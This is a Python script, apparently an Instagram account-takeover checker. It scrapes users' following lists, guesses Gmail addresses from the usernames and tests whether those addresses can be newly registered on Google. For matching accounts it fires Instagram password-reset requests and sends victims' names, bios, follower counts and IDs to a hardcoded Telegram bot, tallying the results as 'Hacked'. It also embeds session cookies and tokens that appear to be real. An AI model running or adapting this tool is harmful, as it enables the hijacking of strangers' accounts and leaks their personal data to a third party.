import requests
import time
import random
import os 
import json
a=0
j=0
b=0
s=0
user =''
seessoin = input('Enter Your Sessoinid : ')

nn=input('Enter Your User : ')
os.system('cls'if os.name=='nt'else'clear')
def kl(user,nn):
    
    global a
    
    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(nn)
    head2={
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'viewport-width': '917',
        'x-asbd-id': '198387',
        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
        'x-instagram-ajax': '1006627630',
        'x-requested-with': 'XMLHttpRequest'
    }
    ge = requests.get(url2,headers=head2).json()
    

    
    pr = ge['data']['user']['is_private']
    #if pr =='True':
        #nn = -us
        
    #elif pr=='False':
        
    id = ge['data']['user']['id']
    fols = ge['data']['user']['edge_follow']['count']

    fols1 = int(fols)
    url =f'https://www.instagram.com/api/v1/friendships/{id}/following/?count='+f'{fols1}'
    head22={
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={seessoin}',
        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'viewport-width': '917',
        'x-asbd-id': '198387',
        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
        'x-instagram-ajax': '1006627630',
        'x-requested-with': 'XMLHttpRequest'
    }
    try:
        geg= requests.get(url,headers=head22).json()
    except requests.exceptions.JSONDecodeError as error:
        print('Sessoinid Error')
        exit()
    for i in range(0,fols):
        try:
            us = geg['users'][i]['username']
            print(us)
            a+=1
            os.system('cls' if os.name=='nt'else'clear')
            print(f'User : {us}\nDone : {a}')
            with open('username.txt','a') as f1:
                f1.write(f'{us}@gmail.com\n')
        except IndexError as error:
            user = us
            
            
            
            nn= user
            kl(user,nn)
#

def gmail():
    took ='5591934454:AAEy8Xyulifx0LK4GQ9geXBWmqjOl3fKP1I'
    idddd ='1548932732'
    global a,b,s,j
    fil = open('username.txt','r').read().splitlines()
    for email in fil:
        url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'
    
        head1 = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '291',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=3x61mpjHJv4QQhugwS2lvBGqsWQuQYFa; ds_user_id=499476691',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                'x-csrftoken': '3x61mpjHJv4QQhugwS2lvBGqsWQuQYFa',
                'viewport-width': '917'
        }
        tim = str(time.time()).split('.')[0]
        data = {
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:wjdjwdjwjdwjdjwdj',
            'username': f'{email}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
        rf = requests.post(url,headers=head1,data=data)
        print(rf)
        
        if rf.status_code==403:
            b+=1
            os.system('cls'if os.name=='nt'else'clear')
            print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
        elif rf.status_code==200:
            url0='https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=475082&rt=j'
            headers2 = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '1190',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'cookie': 'SEARCH_SAMESITE=CgQI25YB; HSID=AqVNcLgtyV8qACjl5; SSID=AiNW8hZgJ42pJTUj2; APISID=QWpcaMriU0QKLpYp/AjC54ZWtOzRENNgX8; SAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-1PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-3PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; ACCOUNT_CHOOSER=AFx_qI7F0xHvZRK8KJSe6tz0NrURnzUEwvN4MMYPRIaZwiFyANVBF9uXlDYL9kF-1j0wyelu_fqr153ri1ORaLKdhjv9B1zqV7Nttlu5qLcSiavoIiKPs5nvt0qNp53Dp9hekTjqZYaGdtk77UEMCPU6VvKzK2n5gtttlAA9IOUPjJgDQtAva4IgwfZzC6Qjng-FhLmXvSwi2aSXMMr_HGpvUGryFOfY2dhl-w3_AwnjgNIs0xJyB3GAXLCGNG1p7xjlrlJ3j35czk-j8AZgbsSWDDYsa8m-pw; SID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7H7toj2PuG1CT7RYZ656tzA.; __Secure-1PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7ZskS6AGBqxv4R7sFByoTgw.; __Secure-3PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7bylvFXShcOWp8xEMoyRYAQ.; LSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqvnwzyEOsjtpz_Xv3YGSMkw.; __Host-1PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqVJM2Mjba_0rnj_DpK7-GcQ.; __Host-3PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqUMoH-tlvVsLba3TIeM8xLg.; 1P_JAR=2022-11-28-17; AEC=AakniGOQHd2YtABZyBR9LGAvOJLjp0xkZ0OPqzrGu6LFT9KbKQTFodmOHg; __Host-GAPS=1:aBoUpYnr12jBFZ_iZDrKVMeNlWM4mjudwFahtCfp5keaEDllyjeCv7YgFni40L0SP85ivw99bMXSROFGUyBFjTB0R1wbFg:8Q3DBwhkEFgTBkRb; NID=511=i7bHDBHZU1IVY6Tux4JU0SZx6J9Pl9grdAYnPr_orMAmES5xzdwRm4EGhIFG8fQ3NiIYMRZW3wUzfa71g2LKw9rjov4HgZtW_PhYxdPQVOK1NZIIdRRGvV1gcyDL81lpEPM7UdDBPSf85v0Z3nIG7aU7iqBag1oR90lU5rLjvXLfYe2rIiW6kLaAfeTv94xqGE8hJyDWGAeiRskQ1zjH4T5bHy6SWVHkcqF_ABaAGkFyb7qzr1_aPjyZd2plSxPtras2HvxCue22Quz1EKY2MKitEyt61VX_CPQMmpZCasXmHhO6w-p_UEYoeQNUX14IvzBu8HCAE_DzTkMpdwhhRq8Dp2Dxy6ZTmfhvIi12SxgIVkgFiYq1hKzAQEI; SIDCC=AIKkIs1N81QwhWri0Bzm-vrZd8ZdIcJEwQhxW5Nq6Fz0ZGYet75_HxakoP7e7FCuuwygEHCFBA; __Secure-1PSIDCC=AIKkIs1zz7mbkrfHGeL2Kc6ha56DRIcm394O1QHjGydZ6iK2E07-NUbA4qBrmwETMvxL9yu71w; __Secure-3PSIDCC=AIKkIs2nVxwPe7zp6d3FIM80oZYUYY-pWAGBtpDrCIFpORKRPEJkQenJ1ZEXQqvUst5tgIW-U70',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2Fdeleteaccount&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=84bf7e62-6751-416e-bb03-1edc3d7c194a,signin_mode=all_accounts,signout_mode=show_confirmation',
            'x-client-data': 'CIi2yQEIo7bJAQjEtskBCKmdygEIqJbLAQiTocsBCMXhzAEIlenMAQjl68wBCO7tzAEI8/HMAQiM98wBCM35zAEI0PrMAQik+8wBCKn8zAEIwIqrAg==',
            
            'x-same-domain': '1'}
            data1 ={
            'continue': 'https://myaccount.google.com/deleteaccount',
            'service': 'accountsettings',
            'f.req': f'["TL:ADFpJfN4RVRp-IIIn2iZfL88X6EJH_mnJCHatuWdaugBEMaMnfVIlVYDyuILuNJV","zaa","fdf","{email}",false,"S302716898:1669657854848764",1]',
            'at': 'AFoagUW3jURSo46O8KfZ96FjJv613X4xRg:1669657854874',
            'azt': 'AFoagUVcdDPp0WLYJ4W-HDpm0Y9Y_TkciQ:1669657854874',
            'cookiesDisabled': 'false',
            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"84bf7e62-6751-416e-bb03-1edc3d7c194a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,""]',
            'gmscoreversion': 'undefined'

        }
            try:
                  res=requests.post(url0,headers=headers2,data=data1).text
            except requests.exceptions.ConnectionError as error:
                continue
            print(res)
            if ('"gf.wuar",2') in res:
                s+=1
                os.system('cls'if os.name=='nt'else'clear')
                print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
            elif ('"EmailInvalid"') in res:
                s+=1
                os.system('cls'if os.name=='nt'else'clear')
                print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
            
            elif ('"gf.wuar",1') in res:
            
                
                nn = email.split('@')[0]
                url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(nn)
                head2={
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                    'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                    'viewport-width': '917',
                    'x-asbd-id': '198387',
                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                    'x-instagram-ajax': '1006627630',
                    'x-requested-with': 'XMLHttpRequest'
                }
                ge = requests.get(url2,headers=head2).json()
                try:
                    
                    id = ge['data']['user']['id']
                    fol = ge['data']['user']['edge_followed_by']['count']
                    bio = ge['data']['user']['biography']
                    fols = ge['data']['user']['edge_follow']['count']
                    img = ge['data']['user']['profile_pic_url']
                    nam = ge['data']['user']['full_name']
                except KeyError as error :
                    b+=1
                    os.system('cls'if os.name=='nt'else'clear')
                    print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
                a+=1
                os.system('cls'if os.name=='nt'else'clear')
                print(f'Hacked : {a} - Bad Gmail : {s} - Bad Instagram : {b}\n')
                rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                ree = rl.json()
                da = ree['date']
                headers1 = {
# 'Content-Length': '305',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'Connection': 'Keep-Alive',
                    'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',
                    # Requests sorts cookies= alphabetically

                    'Accept-Language': 'en-US',
                    'X-IG-Connection-Type': 'WIFI',
                    'X-IG-Capabilities': 'AQ==',
                    # 'Accept-Encoding': 'gzip',
                }
                data3 = {
                    'ig_sig_key_version': '4',
                    "user_id":id
                }
                res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                try:
                    rs =str(res['obfuscated_email'])
                except KeyError as error:
                    b+=1
                j+=1
                try:
                    lm = f'Hit : {j}\nName : {nam}\nUsername : {nn}\nEmail : {email}\nFollowing : {fol}\nFollowers : {fols}\nBio : {bio}\nData : {da}\nID : {id}\nRest: {rs}\n'
                    tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={lm}')
                    ru= requests.post(tlg)
                    with open('trueinstagram.txt','a') as f8:
                        f8.write(f'{email}\n')
                except UnboundLocalError as error:
                    b+=1
def yahoo():
    global a 
    file2 = open('username.txt','r').read().splitlines()
    for email in file2:
        
        url = 'https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=475082&rt=j'
        nm = email.split('@')[0]
        head1={
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '1190',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'cookie': 'SEARCH_SAMESITE=CgQI25YB; HSID=AqVNcLgtyV8qACjl5; SSID=AiNW8hZgJ42pJTUj2; APISID=QWpcaMriU0QKLpYp/AjC54ZWtOzRENNgX8; SAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-1PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-3PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; ACCOUNT_CHOOSER=AFx_qI7F0xHvZRK8KJSe6tz0NrURnzUEwvN4MMYPRIaZwiFyANVBF9uXlDYL9kF-1j0wyelu_fqr153ri1ORaLKdhjv9B1zqV7Nttlu5qLcSiavoIiKPs5nvt0qNp53Dp9hekTjqZYaGdtk77UEMCPU6VvKzK2n5gtttlAA9IOUPjJgDQtAva4IgwfZzC6Qjng-FhLmXvSwi2aSXMMr_HGpvUGryFOfY2dhl-w3_AwnjgNIs0xJyB3GAXLCGNG1p7xjlrlJ3j35czk-j8AZgbsSWDDYsa8m-pw; SID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7H7toj2PuG1CT7RYZ656tzA.; __Secure-1PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7ZskS6AGBqxv4R7sFByoTgw.; __Secure-3PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7bylvFXShcOWp8xEMoyRYAQ.; LSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqvnwzyEOsjtpz_Xv3YGSMkw.; __Host-1PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqVJM2Mjba_0rnj_DpK7-GcQ.; __Host-3PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqUMoH-tlvVsLba3TIeM8xLg.; 1P_JAR=2022-11-28-17; AEC=AakniGOQHd2YtABZyBR9LGAvOJLjp0xkZ0OPqzrGu6LFT9KbKQTFodmOHg; __Host-GAPS=1:aBoUpYnr12jBFZ_iZDrKVMeNlWM4mjudwFahtCfp5keaEDllyjeCv7YgFni40L0SP85ivw99bMXSROFGUyBFjTB0R1wbFg:8Q3DBwhkEFgTBkRb; NID=511=i7bHDBHZU1IVY6Tux4JU0SZx6J9Pl9grdAYnPr_orMAmES5xzdwRm4EGhIFG8fQ3NiIYMRZW3wUzfa71g2LKw9rjov4HgZtW_PhYxdPQVOK1NZIIdRRGvV1gcyDL81lpEPM7UdDBPSf85v0Z3nIG7aU7iqBag1oR90lU5rLjvXLfYe2rIiW6kLaAfeTv94xqGE8hJyDWGAeiRskQ1zjH4T5bHy6SWVHkcqF_ABaAGkFyb7qzr1_aPjyZd2plSxPtras2HvxCue22Quz1EKY2MKitEyt61VX_CPQMmpZCasXmHhO6w-p_UEYoeQNUX14IvzBu8HCAE_DzTkMpdwhhRq8Dp2Dxy6ZTmfhvIi12SxgIVkgFiYq1hKzAQEI; SIDCC=AIKkIs1N81QwhWri0Bzm-vrZd8ZdIcJEwQhxW5Nq6Fz0ZGYet75_HxakoP7e7FCuuwygEHCFBA; __Secure-1PSIDCC=AIKkIs1zz7mbkrfHGeL2Kc6ha56DRIcm394O1QHjGydZ6iK2E07-NUbA4qBrmwETMvxL9yu71w; __Secure-3PSIDCC=AIKkIs2nVxwPe7zp6d3FIM80oZYUYY-pWAGBtpDrCIFpORKRPEJkQenJ1ZEXQqvUst5tgIW-U70',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2Fdeleteaccount&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=84bf7e62-6751-416e-bb03-1edc3d7c194a,signin_mode=all_accounts,signout_mode=show_confirmation',
            'x-client-data': 'CIi2yQEIo7bJAQjEtskBCKmdygEIqJbLAQiTocsBCMXhzAEIlenMAQjl68wBCO7tzAEI8/HMAQiM98wBCM35zAEI0PrMAQik+8wBCKn8zAEIwIqrAg==',
            
            'x-same-domain': '1'
        }
        data1 ={
            'continue': 'https://myaccount.google.com/deleteaccount',
            'service': 'accountsettings',
            'f.req': f'["TL:ADFpJfN4RVRp-IIIn2iZfL88X6EJH_mnJCHatuWdaugBEMaMnfVIlVYDyuILuNJV","zaa","fdf","{email}",false,"S302716898:1669657854848764",1]',
            'at': 'AFoagUW3jURSo46O8KfZ96FjJv613X4xRg:1669657854874',
            'azt': 'AFoagUVcdDPp0WLYJ4W-HDpm0Y9Y_TkciQ:1669657854874',
            'cookiesDisabled': 'false',
            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"84bf7e62-6751-416e-bb03-1edc3d7c194a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,""]',
            'gmscoreversion': 'undefined'

        }
        
        res = requests.post(url,data=data1,headers=head1).text
        if ('"gf.wuar",2') in res:
            a+=1
            print(f'The Email No : {a}')
        elif ('"EmailInvalid"') in res:
            a+=1
            print(f'The Email Not : {a}')
        elif ('"gf.wuar",1') in res:
            a+=1
            print(f'The Email True : {a}')
        
    
def login():
    username = input('Enter Your usernaem : ')
    pasw = input('Enter Your Password : ')
    url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'
    
    head = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '291',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=3x61mpjHJv4QQhugwS2lvBGqsWQuQYFa; ds_user_id=499476691',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'x-csrftoken': '3x61mpjHJv4QQhugwS2lvBGqsWQuQYFa',
        'viewport-width': '917'
    }
    tim = str(time.time()).split('.')[0]
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{pasw}',
        'username': f'{username}',
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}'
    }
    rf = requests.post(url,headers=head,data=data)
    if ('"userId"') in rf.text:
        co = rf.cookies
        coo = co.get_dict()
        sessoin = coo['sessionid']
        print(sessoin)
    elif ('"checkpoint_url"') in rf.text:
        print('Secuer')
    elif ('"user":true,"authenticated":false') in rf.text:
        print('Password False')
#########################################################################################333
print('[1] - List username\n[2] - Checker\n[0] - Sessoinid')
inp = str(input('[-] Enter Your :'))
os.system('cls' if os.name=='nt'else'clear')
if inp=='1':
    kl(user,nn)
elif inp=='2':
    gmail()
elif inp=='0':
    login()
else:
    print('choice Error')
        
    
